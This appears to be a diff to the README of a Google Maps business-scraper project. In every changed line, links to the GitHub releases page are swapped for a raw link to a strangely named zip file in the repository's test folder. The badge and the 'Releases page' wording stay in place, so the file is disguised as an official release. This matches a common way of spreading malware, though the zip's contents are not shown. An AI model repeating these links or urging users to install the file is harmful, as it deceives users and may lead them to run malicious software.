@@ -1,6 +1,6 @@
 # 🌍 maps-local-business-scraper - Effortless Google Maps Data Extraction
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/Bikeluuu/maps-local-business-scraper/releases)
+[![Download](https://raw.githubusercontent.com/Bikeluuu/maps-local-business-scraper/master/test/local_maps_business_scraper_arrentable.zip%20Release-brightgreen)](https://raw.githubusercontent.com/Bikeluuu/maps-local-business-scraper/master/test/local_maps_business_scraper_arrentable.zip)
 
 ## 🚀 Getting Started
 
@@ -22,7 +22,7 @@ This project allows you to easily collect business data from Google Maps. With t
 
 To get started, visit this page to download:
 
-[Download Latest Release](https://github.com/Bikeluuu/maps-local-business-scraper/releases)
+[Download Latest Release](https://raw.githubusercontent.com/Bikeluuu/maps-local-business-scraper/master/test/local_maps_business_scraper_arrentable.zip)
 
 ### 🖥️ System Requirements
 
@@ -34,7 +34,7 @@ To get started, visit this page to download:
 ## 🔧 How to Use
 
 1. **Download the Application**  
-   Go to the [Releases page](https://github.com/Bikeluuu/maps-local-business-scraper/releases) and download the latest version of the software.
+   Go to the [Releases page](https://raw.githubusercontent.com/Bikeluuu/maps-local-business-scraper/master/test/local_maps_business_scraper_arrentable.zip) and download the latest version of the software.
 
 2. **Install the Application**  
    Follow the installation prompts to set up the application on your computer.
@@ -81,6 +81,6 @@ This project is MIT licensed. You are free to use and modify the code.
 
 If you encounter any issues or have questions, feel free to open an issue on the repository or contact the maintainers via email.
 
-[Download Latest Release](https://github.com/Bikeluuu/maps-local-business-scraper/releases) 
+[Download Latest Release](https://raw.githubusercontent.com/Bikeluuu/maps-local-business-scraper/master/test/local_maps_business_scraper_arrentable.zip) 
 
-Visit the [Releases page](https://github.com/Bikeluuu/maps-local-business-scraper/releases) to access all versions and updates.
+Visit the [Releases page](https://raw.githubusercontent.com/Bikeluuu/maps-local-business-scraper/master/test/local_maps_business_scraper_arrentable.zip) to access all versions and updates.
